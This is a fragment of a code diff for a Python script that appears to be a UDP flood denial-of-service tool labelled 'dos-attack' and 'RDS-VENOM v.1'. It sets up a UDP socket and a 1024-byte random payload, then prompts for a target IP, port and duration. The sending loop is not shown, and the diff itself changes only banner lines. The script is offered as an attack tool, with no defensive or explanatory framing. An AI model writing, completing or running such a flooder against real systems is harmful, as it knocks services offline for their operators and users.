@@ -8,13 +8,13 @@ import sys
 import time
 import socket
 import random
-#os.system("bash Bash.sh")
 time.sleep(3)
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1024)
 os.system("clear")
-#os.system ("python banner.py")
+os.system ("figlet dos-attack")
 print("")
+print("                        [*]code by spy >RDS-VENOM v.1")
 ip = raw_input("\033[32;1m" "Target IP : ")
 port = input("\033[32;1m" "port : ")
 dur = input("\033[32;1m" "Time : ")
